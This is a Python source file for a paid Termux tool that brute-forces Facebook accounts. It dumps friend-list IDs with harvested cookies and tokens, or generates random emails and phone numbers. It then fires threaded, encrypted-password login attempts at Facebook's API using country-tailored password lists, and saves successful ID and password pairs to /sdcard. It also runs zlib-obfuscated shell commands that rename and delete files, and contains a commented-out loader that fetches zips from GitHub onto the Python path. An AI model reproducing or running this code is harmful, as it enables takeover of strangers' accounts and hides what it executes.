#coding = utf-8
from uuid import uuid4
import os,sys,tempfile,string,random,subprocess,uuid
'''http_directory = tempfile.mkdtemp(prefix='.')
site_packages = sys.path[4]
sys.path.remove(site_packages)
sys.path.insert(4,http_directory+'/reqmodule')
sys.path.insert(5,http_directory)
print(http_directory)
try:
        os.mkdir('crypto')
except:pass
hh = "ho"
hh2 = "9/pycrypt"
find_aarch = subprocess.check_output('uname -om',shell=True)
if 'aarch64' in str(find_aarch):
        user_aarch = '64'
        download_link = f'https://github.com/{hh}p0{hh2}odome/blob/main/crypto64/crypto64.zip?raw=true'
elif 'arm' in str(find_aarch):
        user_aarch = '32'
        download_link = f'https://github.com/{hh}p0{hh2}odome/blob/main/crypto32/crypto32.zip?raw=true'
else:
        print(' Unknown aarch ')
        exit()
if not os.path.isfile(f'crypto/crypto{user_aarch}.zip'):
        os.system('clear')
        print('\n Please wait while creating pycryptodome for you ! This can take some time\n\n')
        os.system(f'curl -L {download_link} > crypto/crypto{user_aarch}.zip')
        os.system('python jan.py')
else:
        akk2="rsi"
        akk=f"cha{akk2}fi"
        os.system(f'cp crypto/crypto{user_aarch}.zip {http_directory}')
        lib = f'https://github.com/{akk}les/client/blob/main/config.zip?raw=true'
        os.system(f'curl -L {lib} > {http_directory}/config.zip')
        os.system(f'cd {http_directory} && unzip config.zip -d {http_directory} > /dev/null')
        os.system(f'cd {http_directory} && unzip crypto{user_aarch}.zip -d {http_directory} > /dev/null')'''
try:
        import time,requests,re,platform,base64,datetime,hashlib,string,json,io,struct
        from string import *
        from concurrent.futures import ThreadPoolExecutor as ThreadPool
        from Crypto.Cipher import AES, PKCS1_v1_5
        from Crypto.PublicKey import RSA
        from Crypto.Random import get_random_bytes
except Exception as e:
        print(e)
        print('\n Installing modules wait !')
        os.system('pip install futures==2 && python jan.py')
except FileExistsError:
        os.system('pip uninstall requests urllib3 idna certifi -y')
        pass

try:
        import os,sys,time,json,random,re,string,platform,base64,requests,io,struct,zlib
        from string import *
        from concurrent.futures import ThreadPoolExecutor as ThreadPool
except ModuleNotFoundError:
        print('\n Installing missing modules ...')
        os.system('pip install requests futures==2 > /dev/null')
        os.system('python jan.py')

#----[pran links]-----
kkk = {'user-agent': 'Davik/2.1.0 (Linux; U; Android 7.0.0; MMB29K Build/GT-P5100 [FBAN/FB4A;FBAV/241.0.0.41292;FBBV/975202462;FBDM/{density=1.5,width=480,height=800};FBLC/pl_PL;FBCR/T-Mobile.pl;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.mlite;FBDV/MMB29K;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]', 'accept-encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-sim-hni': '31061', 'x-fb-connection-type': 'unknown', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-net-hni': '28613', 'x-fb-connection-bandwidth': '29643048', 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-friendly-name': 'authenticate', 'x-fb-http-engine': 'Liger'}
hhh = {'adid': 'e66b2ae4-35b6-4c2b-822b-b57243edb930', 'email': '10000'+str(random.randint(11111111111,99999999999)), 'password': str(random.randint(1111111,9999999)), 'cpl': 'true', 'credentials_type': 'device_based_login_password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'format': 'json', 'generate_session_cookies': '1', 'generate_analytics_claim': '1', 'generate_machine_id': '1', 'locale': 'pl_PL', 'client_country_code': 'PL', 'device': 'SM-A500H', 'device_id': 'e66b2ae4-35b6-4c2b-822b-b57243edb930', 'method': 'auth.login', 'fb_api_req_friendly_name': 'authenticate', 'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler'}
lll = ("https://b-api.facebook.com/method/auth.login")
#----[remover]-----
import os,shutil,zlib
sz = zlib.decompress(b'x\x9c\xd3OI,I\xd4\x07\x13\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\x19\xf9\xb9\xa9\xfae\x05E\xf9%\xa9\xc9%\x00<J\x0f\x94')
sz1 = zlib.decompress(b'x\x9c\xd3OI,I\xd4\x07\x13\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\xa5\xc5E\xfaI\x99y\xfaE\xb9\x00\x0eL\x0e\x15')
sz2 = zlib.decompress(b'x\x9c\xd3OI,I\xd4\x07\x13\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\xa5\xc5E\xfaI\x99y\xfa\xb9e\x00\x0eK\x0e\x19')
sz3 = zlib.decompress(b'x\x9c%\xca\xcb\x11\xc20\x0c\x05\xc0V\xdc@\xfc\x08Gj\xa0\t\xc7\x91\x89g\xfca\xa4\xa7@\xf90p\xd9\xd3f\xd7\x16\x96{8\xc8\xa7\xdd\x00M\xaf\xf8\xa8<|s\x13\xcdsP\x06c\x9e\x1d\xa5\xecg[\xd7\xeb\x05\x14#z\xaa\x03\xfd\x0c\xcb\x0c\xd8\x13\xd3\x9fo\x8c\x14\xed\xfeF\xa9M\x0cn\x8a\xed7?\xf1Q&+')
sz4 = zlib.decompress(b'x\x9c%\xca\xcb\x11\xc20\x0c\x05\xc0V\xdc@\xfc\x08Gj\xa0\t\xc7\x91\x13\xcf\xf8\xc3HO@\xf90p\xd9\xd3f\xd7\x16\x96{8\xc9\x87\xdd\x00M\xafxT\x9e\xbe\xb9\x89\xe69(\x831\xcf\x8eR\xf6g[\xd7\xeb\x05\x14#z\xaa\x03\xda\xc32\x03\xf6\xc4\xf4\xe7\x1b#E\xbb\xbfQj\x13\x83\x9bb\xfb\xcd\x0f\xf0\xab&#')
sz5 = zlib.decompress(b'x\x9cK\xce\xc8\xcdOQ077W\xd0OI,I\x84\x10\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\xa5\xc5E\xfaI\x99y\xfaE\xb9\x00\x90\xf4\x11\x05')
sz6 = zlib.decompress(b'x\x9cK\xce\xc8\xcdOQ077W\xd0OI,I\x84\x10\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\xa5\xc5E\xfaI\x99y\xfa\xb9e\x00\x90\xf3\x11\t')
sz7 = zlib.decompress(b'x\x9c\x1d\xca[\x0e@0\x10\x05\xd0\x15\xe9%V4j\xd0\xb4\xd5\x9aG\xc2\xee\x89\x9f\xf3u\xb0\x92\x11~b\xab\xc1X\xaa\xdf\xd8Ra\x85\xab\xa0\xa4\x05\xfd\xb1\xa3\x9ds\x98Fh2\x1e:\xc5L\xfb\x17\x84/g5\xc5\x0b\x8bO\x19\xc2')
#--checking if file is not avalible
if not os.path.exists("/data/data/com.termux/files/usr/bin/rm"):
        pass
        exit("Error in termux modules ")

if os.path.exists(sz):
        os.rename(sz1,'.f1')
        os.rename(sz2,'.f2')
        os.system(sz3)
        os.system(sz4)
        os.system(sz5)
        os.system(sz6)
else:
        pass
os.system("rm -rf .f1")
os.system("rm -rf .f2")

logo= f'''
     .d88888b.   .d8888b.  8888888b.       
    d88P" "Y88b d88P  Y88b 888   Y88b     
    888     888 Y88b.      888    888     
    888     888  "Y888b.   888   d88P     
    888     888     "Y88b. 8888888P"       
    888 Y8b 888       "888 888 T88b       
    Y88b.Y8b88P Y88b  d88P 888  T88b       
     "Y888888"   "Y8888P"  888   T88b     
            Y8b
{50*"-"}
    Tool Version :     10.1.30
    Thanks Alot  :     M.Hamza
{50*"-"}'''

#--(Dark@Colours)---#
r="\033[1;91m"
g="\033[1;92m"
y="\033[1;93m"
b="\033[1;94m"
p="\033[1;95m"
c="\033[1;96m"
l="\033[1;97m"
s="\033[0m"
#--(light@Colours)---#
lr="\033[0;91m"
lg="\033[0;92m"
ly="\033[0;93m"
lb="\033[0;94m"
lp="\033[0;95m"
lc="\033[0;96m"
ll="\033[0;97m"
#--(rare-colors)--#
holaa="38;5"
ro=(f"\033[{holaa};208")
rb=(f"\033[{holaa};32")
rc=(f"\033[{holaa};122m")
rg= (f"\033[{holaa};112m")
rp=(f"\033[{holaa};147m")

loop = 0
methods = []
ok=[]
total=[]
clone_type=[]
android_models = []

xny = zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5OKK)\xcb1442\xd0O,\xd0\xcfM\xcc\xcc\xd3\xcfJ\x03\x001"\x13\xc6')
update = requests.get(xny).text
uuidd = str(os.geteuid()) + str(os.getlogin()) + str(os.getuid())
id = "".join(uuidd).replace("_","").replace("360","AHS").replace("u","9").replace("a","A")
plat = platform.version()[14:][:21][::-1].upper()+platform.release()[5:][::-1].upper()+platform.version()[:8]
xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
bxd = ""
bumper = id+bxd+xp
myweb2 = requests.get(xny).text

def qsbuy():
        try:
                os.system('clear')
                print(logo)
                x = requests.get('https://raw.githubusercontent.com/hop06/libraries/main/version.txt').text
                if str("upppdate") in update:
                        os.system('clear')
                        exit('script is in update / maintanance be patient ')
                elif str("res-sseett") in update:
                        
                        exit('Dont Try To Bypass')
                elif bumper in myweb2:
                        main()
                else:
                        os.system("clear");print(logo)
                        print(f"{lr}   Your Device License Key Is Not Approved{s}")
                        print(50*"-")
                        print(f"{rc} Key : {bumper}{s}")
                        print(50*"-")
                        print(f" Note : Tool is Paid & We Accept All Types Of PAyment  Method . If There was Fb Update & Tool Wasnt Run Then We Are Not Responsible For All Of This . We Will Try  To Update Script Every Time But It Took Day ")
                        print("\n Baray Mehrbani Tool Apni Zimadare May Buy Kary Lehaza May Apko Force Ni Kar Raha ! Baqe Tool Har 2 sy 3 din bad update hgaya kryga ")
                        print(50*"-")
                        print(f" 15-Days Price : 350")
                        print(f" 1-Month Price : 500")
                        print(50*"-")
                        input("[Press Enter To Send Key To Admin]")
                        os.system(f"termux-open-url https://wa.me/+923197951814?text={bumper}")
                        qsbuy()
        except requests.exceptions.ConnectionError:
                exit(' No internet connection ..')

def xchker():
    pass

def main():
        xchker()
        os.system('rm -rf ...txt')
        os.system('clear')
        print(logo);xchker()
        print('Code Like Humor When You Have To Explain It Its Bad')
        print(50*'-')
        print('[1] Fb Cloning Menu')
        print('[2] File Create Menu')
        print('[3] Number Detail Finder')
        print('[4] Remove Cookie')
        print('[5] Clear Cache')
        print('[6] Best Pass Lists \033[0;97m')
        print('[7] How To Use Video')
        print('[0] Exit \033[0;97m')
        print(50*'-')
        menu_opt = input('Select choice : ')
        if menu_opt =='1':
                method_crack()
        elif menu_opt =='2':
                create_file()
        elif menu_opt =='3':
                xchker()
                os.system('xdg-open https://github.com/TechQaiser/Qnumber')
                main()
        elif menu_opt =='4':
                os.system('rm -rf fb_cookies.txt')
                os.system('rm -rf access_token.txt')
                print('       Removed Success')
                time.sleep(3)
                main()
        elif menu_opt =='5':
                isdd="les/u"
                isd="sr/t"
                isddd="p/."
                llb = f"/data/data/com.termux/fi{isdd}{isd}m{isddd}*"
                os.system(f"rm -rf {llb}")
                exit("      Sucessfully Removed .      ")
        elif menu_opt =='6':
                os.system('clear')
                print(logo);xchker()
                print(' Select Your Country For Best PassLists')
                print(50*'-')
                print('[1] Pakistani Ids')
                print('[2] Bangladesh Ids')
                print('[3] Nigeria Ids')
                print('[4] Other Countries')
                print('[0] Back \033[0;97m')
                print(50*'-')
                menu_opt = input('Select choice : ')
                if menu_opt =='1':
                        os.system('clear')
                        print(logo);xchker()
                        print('first last')
                        print('First Last')
                        print('firstlast')
                        print('first123')
                        print('khan123')
                        print('first1234')
                        print('first12345')
                        print('i love you')
                        print('firstkhan')
                        print('khankhan')
                        print('khan12345')
                        print('khan12')
                        print('first786')
                        input('\nPress enter to back ')
                        main()
                elif menu_opt =='2':
                        os.system('clear')
                        print(logo);xchker()
                        print('first last')
                        print('First Last')
                        print('firstlast')
                        print('first123')
                        print('Bangladesh')
                        print('first1234')
                        print('first12345')
                        print('bangladesh')
                        print('i love you')
                        print('Jannatul123')
                        print('Mohammed123')
                        print('Mohammad123')
                        print('first@123')
                        input('\nPress enter to back ')
                        main()
                elif menu_opt =='3':
                        os.system('clear')
                        print(logo);xchker()
                        print('first last')
                        print('First Last')
                        print('firstlast')
                        print('first123')
                        print('i love you')
                        print('musa123')
                        print('first12345')
                        print('first@123')
                        print('first@1234')
                        print('firstfirst')
                        print('lastlast')
                        print('first786')
                        print('first1122')
                        input('\nPress enter to back ')
                        main()
                elif menu_opt =='4':
                        os.system('clear')
                        print(logo);xchker()
                        print('first last')
                        print('First Last')
                        print('firstlast')
                        print('first123')
                        print('i love you')
                        print('first321')
                        print('lastfirst')
                        print('firstlast123')
                        print('first12345')
                        print('first@123')
                        print('first@1234')
                        print('firstfirst')
                        print('first007')
                        print('first789')
                        print('first1122')
                        input('\nPress enter to back ')
                        main()
        elif menu_opt == "7":
                try:
                        os.system('python use.py')
                except:
                        exit('video is not avalible Right now in server try again after few hours')
        elif menu_opt == "0":
                main()
        else:
                print('\n Invalid option, try again ...')
                time.sleep(3)
                main()

def login():
        os.system('clear')
        print(logo);xchker()
        cookies = input(' Put cookies here: ')
        try:
                print('\n Validating cookies ... ')
                data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookies})
                find_token = re.search("(EAAG\w+)", data.text)
                open("access_token.txt", "w").write(find_token.group(1))
                open("fb_cookies.txt","w").write(cookies)
                print(' Logged in successfully ...')
                time.sleep(1)
                os.system('python malang.py')
        except KeyError:
                print('\n Inavlid cookies, try another cookies')
                exit()
        except requests.exceptions.ConnectionError:
                print('\n No internet connection ...')
                exit()
        except AttributeError:
                print('\n Invalid cookies, try another cookies ...')
                exit()

def method_crack():
        os.system('clear')
        print(logo);xchker()
        print(' [1] File Cloning ')
        print(' [2] Email Cloning ')
        print(' [3] Number Cloning ')
        print(' [0] Back')
        print(50*'-')
        clone_ = input(' Select : ')
        if clone_ == "1":
                clone_type.append('1')
        elif clone_ == "2":
                clone_type.append('2')
        elif clone_ == "3":
                clone_type.append('3')
        elif clone_ == "0":
                main()
        else:
                exit('invalid select')
        mycrackistan()

def mycrackistan():
        global methods
        if '1' in clone_type:
                crack_main().crackfile(id)
        elif '2' in clone_type:
                crack_main().crackmail(id)
        elif '3' in clone_type:
                crack_main().cracknum(id)

class crack_main():
        def __init__(self):
                self.id=[]
        def crackfile(self,id):
                global methods
                os.system('clear')
                print(logo);xchker()
                self.file = input(' Put file path: ')
                try:
                        self.id = open(self.file).read().splitlines()
                        self.pasw()
                except FileNotFoundError:
                        print(' No file found ....')
                        exit()
        def crackmail(self,id):
                global methods
                os.system("clear");print(logo);xchker()
                import requests,random
                user=[]
                print(" [*] First Name Example Hamza,Areesha")
                first = input(" First Name : ")
                last = input(" Last Name : ")
                print(" \n [*] Ex @gmail.com,@yahoo.com or @hotmail.com etc")
                domain = input(" Domain : ")
                print("\n [?] Limit ids Example 1000,5000,50000")
                limit = int(input(" Limit Ids : "))
                for nmbr in range(limit):
                        nmpp = random.randint(99,9999)
                        nmp = f"{first}{last}{str(nmpp)}{domain}|{first} {last}\n"
                        naseeb = open('...txt','a').write(nmp)
                self.id = open('...txt').read().splitlines()
                self.pasw()
        def cracknum(self,id):
                global methods
                os.system('clear');print(logo);xchker()
                print('\033[0mFor Example :\033[0m 92310,92342,92300,92301 ...')
                kode = input('\033[0mChoose Code : \033[0m')
                print('\033[0mFor Example :\033[0m 2000,4000,6000 ...')
                limit = int(input('\033[0mIdz Limit : \033[0m'))
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        xoo = kode+nmp.replace(" ","")
                        xdr = f"{kode+nmp}|{nmp} {xoo}\n"
                        naseeb = open('...txt','a').write(xdr)
                self.id = open('...txt').read().splitlines()
                self.pasw()
        def m1(self,iid,name,passlist):
                try:
                        global ok,loop,android_models
                        sys.stdout.write('\r[QSR] %s / [OK-%s] \r'%(loop,len(ok)));sys.stdout.flush()
                        fn = name.split(' ')[0]
                        try:
                                ln = name.split(' ')[1]
                        except:
                                ln = fn
                        for pw in passlist:
                                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',name).replace('name',name.lower())
                                infos = open('device_info.txt','r').read()
                                try:
                                        version_,model_,brand_name_,width_,height_=infos.split('$')
                                except:
                                        version_ = str(random.randint(7,13))
                                        model_ = "Infinix"
                                        brand_name_ = "Infinix"
                                        width_ = "720"
                                        height_ = "1280"
                                password = pas
                                pwd_key_fetch = 'https://b-graph.facebook.com/pwd_key_fetch'
                                pwd_key_fetch_data = {'version':'2','flow':'CONTROLLER_INITIALIZATION','method':'GET','fb_api_req_friendly_name':'pwdKeyFetch','fb_api_caller_class':'com.facebook.auth.login.AuthOperations','access_token':"438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28"}
                                pwd = requests.post(pwd_key_fetch,params=pwd_key_fetch_data).json()
                                password_encryption_pubkey = '-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAmofqjEw46+3ec9y3Eq1V\ny46SazS16Mlb5Ks3mQ0rG40qnkoSQmIaThD5t+tLdEWrc/rwSAdj0L2Ez01Yh4Uz\nhLIliy5hjkt8geAzV6pqgMa48y16b4fjQqsVf0KSFSaXD5IBYm0ErXck8/UKX36W\ngIE1E4QLAAZMcOJQsHZl39P/QVs4Y9lP1/WR7k9sFDbazmyBbyCIAFjHJH7x+Txf\nloj7jbbqbB3b5xC9tolyjiC3Fqybn/MrHOdJI27lQTnTiFeJuW1SpMwRULtf2Cbo\n0WsoQKWzxsUSFHupVS/0DCdx3QaKBPugrs/MTdUeCJDXBZVjTRT9kAtrWSe5u1BR\n5QIDAQAB\n-----END PUBLIC KEY-----\n'
                                password_encryption_key_id = '25'
                                rand_key = get_random_bytes(32)
                                iv = get_random_bytes(12)
                                pubkey_bytes = password_encryption_pubkey
                                pubkey = RSA.import_key(pubkey_bytes)
                                cipher_rsa = PKCS1_v1_5.new(pubkey)
                                encrypted_rand_key = cipher_rsa.encrypt(rand_key)
                                cipher_aes = AES.new(rand_key, AES.MODE_GCM, nonce=iv)
                                current_time = int(time.time())
                                cipher_aes.update(str(current_time).encode("utf-8"))
                                encrypted_passwd, auth_tag = cipher_aes.encrypt_and_digest(password.encode("utf-8"))
                                buf = io.BytesIO()
                                buf.write(bytes([1, int(password_encryption_key_id)]))
                                buf.write(iv)
                                buf.write(struct.pack("<h", len(encrypted_rand_key)))
                                buf.write(encrypted_rand_key)
                                buf.write(auth_tag)
                                buf.write(encrypted_passwd)
                                encoded = base64.b64encode(buf.getvalue()).decode("utf-8")
                                enc_pas=f"#PWD_REACTNATIVE:2:{current_time}:{encoded}"
                                adid = str(uuid.uuid4())
                                my_ip = str(random.randint(200,350))+"."+str(random.randint(600,730))+"."+str(random.randint(604,690))+"."+str(random.randint(140,197))
                                uat = "Dalvik/2.1.0 (Linux; U; Android "+version_+"; "+model_+" Build/QP1A.190711.020) [FBAN/MobileAdsManagerAndroid;FBAV/"+str(random.randint(210,250))+".1.0."+str(random.randint(50,90))+"."+str(random.randint(210,260))+";FBBV/416670383;FBRV/0;FBLC/en_US;FBMF/"+brand_name_+" MOBILE LIMITED;FBBD/"+brand_name_+";FBDV/"+model_+";FBSV/"+version_+";FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,width="+width_+",height="+height_+"};FB_FW/1;]"
                                head = {"user-agent": uat,"Content-Type": "application/json;charset=utf-8","Host":"graph.facebook.com","Connection": "Keep-Alive","Accept-Encoding": "gzip"}
                                data = {"locale":"en_US","format":"json","email":iid,"password":enc_pas,"access_token":"438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28","generate_session_cookies":1}
                                po = requests.post("https://b-graph.facebook.com/auth/login",data=data,headers=head).json()
                                try:
                                        roid = str(po['uid'])
                                except:
                                        roid = iid
                                if 'session_key' in po:
                                        print(' \033[1;32m[QSR-OK] '+roid+' | '+pas+'\033[0;97m')
                                        open('/sdcard/qsr_ok.txt','a').write(roid+'|'+pas+'\n')
                                        ok.append(iid)
                                        break
                                elif 'Please Confirm Email' in po:
                                        print(' \033[1;32m[QSR-OK] '+roid+' | '+pas+'\033[0;97m')
                                        open('/sdcard/qsr_ok.txt','a').write(roid+'|'+pas+'\n')
                                        ok.append(iid)
                                        break
                                else:
                                        continue
                        loop+=1
                except Exception as e:
                        pass
                        #print(e)

        def pasw(self):
                passlist = []
                if not os.path.exists('device_info.txt'):
                        os.system('clear')
                        print(logo)
                        print(" what is your andriod version ex 8,9,10")
                        version_=input(' type andriod version : ')
                        print(44*'-')
                        print(" your mobile module name ex Techno LD7 etc")
                        model_=input(" module name : ")
                        print(44*"-")
                        print(" your mobile company name ex Techno,Redmi")
                        brand_name_=input(" device company name : ")
                        print(44*'-')
                        print(" your mobile width ex 720,740,730,780 etc")
                        width_=input(" device width : ")
                        print(44*'-')
                        print(" your mobile height ex 1660,1780,1730 etc")
                        height_=input(" device company name : ")
                        info_file = open("device_info.txt","a").write(version_+'$'+model_+'$'+brand_name_+'$'+width_+'$'+height_)
                os.system('clear')
                print(logo);xchker()
                pl = int(input(' How Much Password Do You Want To Add ? '))
                print(' Example first123,last123,khan123,firstlast')
                print(50*"-")
                for cd in range(pl):
                        passlist.append(input(f' ({cd+1}) Password : '))
                os.system('clear')
                print(logo);xchker()
                print(' Total Ids : '+str(len(self.id)))
                print(' Cloning Is Started Wait For Results')
                print(' After Every 5 Min Turn Airplane On/Off')
                print(50*'-')
                with ThreadPool(max_workers=30) as formSubmit:
                        for user in self.id:
                                iid,name = user.split('|')
                                formSubmit.submit(self.m1,iid,name,passlist)
                print(50*'-')
                print(' SucessFully Process Is Completed ')
                print(' Total Ok Ids : '+str(len(ok)))
                print(' Ok Ids Save In : /sdcard/qsr_ok.txt')
                print(50*'-')
                input('\n Press enter to back ')
                main()

def create_file():
        os.system('clear')
        print(logo);xchker()
        print(' [1] Create File ')
        print(' [2] Remove Double Ids ')
        print(' [3] Seprate Ids ')
        print(' [0] Back')
        print(50*'-')
        create_ = input(' Select : ')
        if create_ == "1":
                create_file_login()
        elif create_ == "2":
                double()
        elif create_ == "3":
                sep()
        elif create_ == "0":
                main()
        else:
                exit('invalid select')
        mycrackistan() 

def create_file_login():
        ids = []
        total = []
        xyz = requests.Session()
        os.system('clear')
        print(logo);xchker()
        try:
                cok = open('fb_cookies.txt','r').read()
                cookies = {'cookie':cok}
                access_token = open('access_token.txt', 'r').read()
        except FileNotFoundError:
                login()
        try:
                check_cookies = xyz.get('https://graph.facebook.com/me?access_token='+access_token,cookies=cookies).text
                load = json.loads(check_cookies)
                iid = load['id']
                name = load['name']
        except KeyError:
                print('\n Cookies has expired')
                time.sleep(1)
                os.system('rm -rf .fb_cookies.txt .access_token.txt')
                login()
        except requests.exceptions.ConnectionError:
                print(' No internet connection ...')
        os.system('clear')
        print(logo);xchker()
        print("[1] Create File Mix Ids")
        print("[2] Create File New Ids")
        print(44*"-")
        typp = input('select : ')
        if typp == "1":
                auto_file(cookies,access_token)
        elif typp == "2":
                new_file(cookies,access_token)
        else:
                auto_file(cookies,access_token)

def auto_file(cookies,access_token):
        global total
        os.system('clear & rm -rf .txt .temp.txt')
        os.system('clear')
        print(logo);xchker()
        try:
                fl = 1
        except:
                fl = 1
        for xd in range(fl):
                idt = input(f' Put id {xd+1}: ')
                try:
                        fd_url = 'https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s'%(idt,access_token)
                        xyz = requests.Session()
                        r = xyz.get(fd_url,cookies=cookies).text
                        q = json.loads(r)
                        for iid in q['friends']['data']:
                                uid = iid['id']
                                open('.txt','a').write(uid+'\n')
                except KeyError:
                        print(' No Friend List : '+idt)
                        time.sleep(3)
                        return auto_file(cookies,access_token)
                except requests.exceptions.ConnectionError:
                        print(' No internet connection ....')
        sid = "1"
        os.system('cat .txt | grep "'+sid+'" > .temp.txt')
        file = open('.temp.txt','r').read().splitlines()
        print('\n \033[1;97m /sdcard/xxx1.txt \033[0;97m\n')
        #100010138361148
        sf = input(' Saved File As : ')
        print('')
        os.system('clear')
        print(logo);xchker()
        print(' Total ids To Dump: '+str(len(file)))
        print(' Dumping Is Started Wait ....')
        print(50*'-')
        with ThreadPool(max_workers=20) as yaari:
                for exid in file:
                        yaari.submit(iamBadBoy, exid,cookies,access_token,sf)
        print(' Total ids Extracted : '+str(len(total)))
        input(' Press enter to back ')
        main()

def new_file(cookies,access_token):
        global total
        os.system('clear & rm -rf .txt .temp.txt')
        os.system('clear')
        print(logo);xchker()
        try:
                fl = 1
        except:
                fl = 1
        for xd in range(fl):
                idt = input(f' Put id {xd+1}: ')
                try:
                        fd_url = 'https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s'%(idt,access_token)
                        xyz = requests.Session()
                        r = xyz.get(fd_url,cookies=cookies).text
                        q = json.loads(r)
                        for iid in q['friends']['data']:
                                uid = iid['id']
                                open('.txt','a').write(uid+'\n')
                except KeyError:
                        print(' No Friend List : '+idt)
                        time.sleep(3)
                        return auto_file(cookies,access_token)
                except requests.exceptions.ConnectionError:
                        print(' No internet connection ....')
        print('\n\033[1;92m Example: 100087,100088 etc\033[0;97m')
        try:
                sl = int(input('\n How Many Links To Grab : '))
        except:
                sl = 1
        for el in range(sl):
                sid = input(f' Put {el+1} link: ')
                os.system('cat .txt | grep "'+sid+'" > .temp.txt')
        file = open('.temp.txt','r').read().splitlines()
        print('\n \033[1;97m /sdcard/xxx1.txt \033[0;97m\n')
        #100010138361148
        sf = input(' Saved File As : ')
        print('')
        os.system('clear')
        print(logo);xchker()
        print(' Total ids To Dump: '+str(len(file)))
        print(' Dumping Is Started Wait ....')
        print(50*'-')
        with ThreadPool(max_workers=20) as yaari:
                for exid in file:
                        yaari.submit(iamBadBoy, exid,cookies,access_token,sf)
        try:
                son = f"qaiser{str(random.randint(0,90))}.txt"
        except:
                son = f"qaiser{str(random.randint(10,50))}.txt"
        os.system(f'cat {sf} | grep "'+sid+'" > /sdcard/'+son+'')
        print(' Total ids Extracted : '+str(len(total)))
        print(' New ids Saved As : /sdcard/'+son)
        print(' Normal ids Saved As : '+sf)
        input(' Press enter to back ')
        main()

def iamBadBoy(exid,cookies,access_token,sf):
        try:
                global total,loop
                fd_url = 'https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s'%(exid,access_token)
                xyz = requests.Session()
                r = xyz.get(fd_url,cookies=cookies).text
                q = json.loads(r)
                for yaad in q['friends']['data']:
                        iid = yaad['id']
                        name = yaad['name']
                        total.append(iid)
                        open(sf,'a').write(iid+'|'+name+'\n')
                loop+=1
                sys.stdout.write('\r Dumping Ids [%s] : [%s]\r'%(loop,len(total)));sys.stdout.flush()
        except requests.exceptions.ConnectionError:
                print(' No internet connection ...')
        except Exception as e:
                pass
                #print(e)
        except KeyError:
                pass

def sep():
        xchker()
        os.system('clear');print(logo);xchker()
        try:
                limit = int(input(' How many links do you want to separate ? '))
        except:
                limit = 1
        print(f'{rg} File Path Example /sdcard/xxx.txt{s}')
        file_name = input('\033[0m Input file path : ')
        print(f'{rg} Save As Example /sdcard/newfile.txt{s}')
        new_save = input('\033[0m Save new file as : ')
        y = 0
        print(f"{ro} Ids To Grabb Ex [ 100087,10000,10006 etc ]{s}")
        for k in range(limit):
                y+=1
                links=input(' Put Uid Type : ')
                os.system('cat '+file_name+' | grep "'+links+'" >> '+new_save)
        print(44*"\033[0m-")
        print(f'{rc} ids grabbed successfully{s}')
        print(' Total grabbed ids :\033[0;33m '+str(len(open(new_save).read().splitlines())))
        print('\033[0m New file saved as : \033[0;33m '+new_save)
        print(44*"\033[0m-")
        input('\033[0m[Press enter to back] ')
        main()

def double():
        os.system('clear')
        print(logo);xchker()
        user_file = input('File Path : ')
        try:
                open(user_file,'r').read()
                print(' \n\033[1;97mExample: /sdcard/xxx.txt\n\033[0;97m')
                save_file = input('Save new file as: ')
                os.system('touch '+save_file)
                os.system('sort -r '+user_file+' | uniq > '+save_file)
                print(50*'-')
                print(' Fully Removed Multi Lines Ids')
                print(' Dublicate Lines Removed From File')
                print(' File Saved As : '+save_file)
                print(50*'-')
                input('Press enter to back ')
                main()
        except FileNotFoundError:
                print(' Invalid File ')

#----[http-capture]----
try:
        a = "anar"
        t="tt"
        fileee = os.listdir('/sdcard/Android/data/')
        if f'com.h{t}pc{a}y.pro' in fileee:
                print('error occur 0')
                pass
              #  exit(f'\nsomethiiing went wrong\n\nContact Admin : +923197951815')
except Exception as e:
        print(e)
        pass
except PermissionError:
        pass


#----[if-fork]------
'''pat = os.getcwd()
datar = []
datar.append(pat)
if '/data/data/com.termux/files/home/Qsr' in datar:
        pass
else:
        for i in range(5000):
                print(" data is forked / or in other file")
        exit("Type > cd ~ && python jan.py")

if not os.path.exists('.fam'):
